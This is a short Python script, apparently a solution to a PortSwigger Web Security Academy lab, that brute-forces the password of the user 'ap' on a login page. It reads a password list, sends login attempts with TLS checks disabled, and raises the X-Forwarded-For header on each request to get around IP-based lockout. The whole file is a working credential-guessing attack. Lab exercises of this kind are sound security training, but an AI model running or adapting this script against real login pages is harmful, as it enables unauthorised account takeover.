import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://ace11ff31e39434ec0376f410034003c.web-security-academy.net/login"
page_cookies = {'session': 'wScusJzRlloG4kBn4bHynni2pesDqFZ6'}

pass_file = open('pass_portswigger.txt', 'r')
pass_list = pass_file.readlines()
pass_file.close()

x_forwarded = 600

for password in pass_list:
    x_forwarded += 1
    page_headers = {'X-Forwarded-For': str(x_forwarded)}
    body = {'username': 'ap', 'password': password.strip()}

    req = requests.post(url, data=body, cookies=page_cookies, headers=page_headers, verify=False)

    if 'Invalid username or password.' in req.text:
        print(f"{password.strip()}:{req.status_code}:Invalid password")
    else:
        print(f"{password.strip()}:{req.status_code}:GG")
        break
